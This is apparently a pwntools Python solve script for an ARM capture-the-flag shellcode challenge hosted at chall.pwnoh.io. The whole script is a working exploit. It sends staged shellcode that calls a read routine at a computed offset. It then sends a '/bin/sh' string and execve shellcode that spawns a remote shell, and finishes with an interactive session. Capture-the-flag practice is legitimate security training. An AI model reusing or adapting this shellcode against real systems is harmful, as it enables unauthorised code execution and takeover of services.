from pwn import *

context.arch = "arm"

gdbscript = """
b *main
b chal.c:105
c
"""


#0x21f94
sc = """
ldr r10, [r11]
movs r9, #0x0

add r9, r9, #0x2
lsl r9, 8
add r9, r9, #0x1f
lsl r9, 8
add r9, r9, #0x94

movs r8, r3
add r10, r9, r10
movs r1, r3
movs r2, #0xff
blx r10
"""
sc_comp = asm(sc)

sc_hex = sc_comp.hex()


#io = gdb.debug("./chal",gdbscript=gdbscript)
io = remote("chall.pwnoh.io",13375)
#io = process("./chal")

io.recvuntil(b'Enter your shellcode (in hex please) up to 512 chars')

io.sendline(sc_hex.encode())

sleep(2)

sc_2 = """
movs r0, r8
movs r1, #0x0
movs r2, #0x0
movs r7, #11
svc #0
"""

sc_asm = asm(sc_2)

sc_2 = b'/bin/sh\x00'+b'\x00'*0x90 + sc_asm

io.send(sc_2)

io.interactive()